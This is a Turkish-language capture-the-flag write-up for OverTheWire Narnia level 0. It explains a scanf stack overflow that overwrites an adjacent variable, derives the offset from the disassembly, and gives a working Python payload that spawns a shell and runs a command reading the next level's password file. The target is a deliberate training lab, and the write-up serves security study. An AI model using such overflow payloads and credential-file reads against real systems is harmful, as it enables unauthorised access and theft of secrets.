# OverTheWire — Narnia Level 0 → 1

> Hedef: `narnia0`'dan `narnia1` şifresi. Sonuç: **`**********`** (gizlendi)
> Teknik: stack buffer overflow → **bitişik değişkeni** (`val`) ezme (EIP değil).
> Ortam: 32-bit, ASLR kapalı, stack executable.

---

## 1. Bağlantı
```bash
ssh narnia0@narnia.labs.overthewire.org -p 2226   # şifre: narnia0
```

## 2. Kaynak (`/narnia/narnia0.c`)
```c
int main(){
    long val = 0x41414141;     // hedef: 0xdeadbeef yapmak
    char buf[20];
    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s", &buf);       // AÇIK: 20'lik buffer'a 24 char okur
    printf("buf: %s\n", buf);
    printf("val: 0x%08x\n", val);
    if(val == 0xdeadbeef){ setreuid(geteuid(),geteuid()); system("/bin/sh"); }
    else { printf("WAY OFF!!!!\n"); exit(1); }
}
```

## 3. Zafiyet
`scanf("%24s")` 24 karaktere izin verir (+ `\0` → 25 byte) ama `buf` 20 byte. Fazlalık
bitişikteki `val`'i ezer. `val`'in baytları (`ef be ad de`) boşluk/tab/newline değil →
`scanf %s` kesmez, şanslıyız.

## 4. Offset — disasm'dan
```
mov  DWORD PTR [ebp-0xc], 0x41414141    ; val = ebp-0x0c
lea  eax, [ebp-0x20]                    ; buf = ebp-0x20
```
`buf → val` mesafesi = `0x20 - 0x0c = 0x14 = **20 byte**`. (Kaynaktaki `buf[20]` ile birebir.)

```
[ buf (20) ][ val (4) ][ saved ebp ][ saved eip ]
  └ 20 dolgu ┘ └ 0xdeadbeef ┘
```

## 5. Exploit
```
payload = "A"*20 + 0xdeadbeef (LE: \xef\xbe\xad\xde)   = 24 byte
```
`scanf %24s` tam 24 baytı okur; geri kalan stdin spawn olan shell'e gider.

> ⚠️ **stdio buffering tuzağı (canlı çözümde çıktı):** payload'ı `| ./narnia0` ile tek
> seferde verince `system("/bin/sh")`'nin child shell'ine stdin kalmaz (`scanf` tüm pipe'ı
> glibc buffer'ına çeker). Çözüm: payload'ı gönder, **kısa bekle** (scanf okusun + shell
> açılsın), sonra komutu gönder:
```bash
python3 -c '
import sys,time
sys.stdout.buffer.write(b"A"*20 + b"\xef\xbe\xad\xde"); sys.stdout.flush(); time.sleep(1.5)
sys.stdout.buffer.write(b"id; cat /etc/narnia_pass/narnia1\n"); sys.stdout.flush(); time.sleep(1.0)
' | /narnia/narnia0
```
Çıktı:
```
val: 0xdeadbeef
uid=14001(narnia1) gid=14000(narnia0) groups=14000(narnia0)
**********
```


## Dersler
| Konu | Not |
|------|-----|
| Komşu değişken ezme | Taşan buffer bitişik `val`'i bozar (EIP'ye gerek yok) |
| `scanf %Ns` | N char + `\0` → N+1 byte yazabilir; boşluk/`\n`/`\t`'de kesilir |
| Little-endian | `0xdeadbeef` → `\xef\xbe\xad\xde` |
| stdio buffering | `scanf` pipe'ı slurp eder → komutu zamanlı besle |
| Offset doğrula | Kaynaktaki `buf[20]` ≠ garanti; disasm'dan teyit (`ebp-0x20` vs `ebp-0xc`) |

